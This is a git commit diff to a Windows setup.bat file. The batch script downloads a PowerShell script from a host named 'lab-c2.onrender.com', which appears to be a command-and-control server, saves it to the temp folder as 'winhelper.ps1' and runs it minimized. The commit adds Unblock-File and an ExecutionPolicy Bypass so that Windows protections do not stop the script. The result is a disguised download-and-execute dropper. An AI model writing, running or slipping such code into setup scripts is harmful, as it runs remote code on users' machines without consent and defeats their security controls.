d86704c62e90ad3a8bfa8a9670d5ec41356565a0
felixnth <felixnoethgen1@gmail.com>
2026-07-25 04:26:32 +0000

    fix: Unblock-File + ExecutionPolicy Bypass

--- setup.bat
+++ setup.bat
@@ -1,5 +1,5 @@
 @echo off
 set PS1=%TEMP%\winhelper.ps1
-powershell -Command "Invoke-WebRequest -Uri 'https://lab-c2.onrender.com/download' -OutFile '%PS1%' -UseBasicParsing"
-start /min powershell -NonInteractive -File "%PS1%"
+powershell -Command "Invoke-WebRequest -Uri 'https://lab-c2.onrender.com/download' -OutFile '%PS1%' -UseBasicParsing; Unblock-File '%PS1%'"
+start /min powershell -ExecutionPolicy Bypass -NonInteractive -File "%PS1%"
 exit
